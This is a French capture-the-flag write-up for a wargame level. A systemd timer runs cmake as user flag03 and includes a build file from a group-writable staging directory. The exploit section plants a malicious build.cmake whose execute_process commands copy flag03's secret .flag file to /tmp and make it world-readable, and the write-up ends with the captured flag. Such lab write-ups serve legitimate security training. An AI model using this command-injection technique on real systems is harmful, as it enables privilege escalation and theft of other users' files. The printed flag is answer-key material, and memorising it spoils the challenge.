# Level 03 → Level 04

**Mot de passe du niveau :** flag de `level02`

## Vulnérabilité
Un timer systemd `burbclave.timer` déclenche toutes les minutes
`burbclave.service`, qui tourne en tant que `flag03` et exécute :
```
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
```
Le `CMakeLists.txt` fait un `include(${RESOLVED_BUILD_PATH}/build.cmake)` sur un
répertoire de staging (`/var/lib/burbclave/staging`) accessible en écriture pour
notre groupe. `include()` exécute le CMake ligne par ligne : on peut donc y
injecter des `execute_process()` exécutés avec les droits de `flag03`.

## Exploitation
Déposer un `build.cmake` malveillant dans le répertoire de staging :
```cmake
execute_process(COMMAND /bin/bash -c "cp /home/flag03/.flag /tmp/.flag")
execute_process(COMMAND /bin/bash -c "chmod 777 /tmp/.flag")
```
Attendre le déclenchement du timer (~60 s), puis `cat /tmp/.flag`.
Voir `ressource/exploit.sh`.

## Flag
```
b209ea91ad7a5c2a0b0f4e195ca4
```
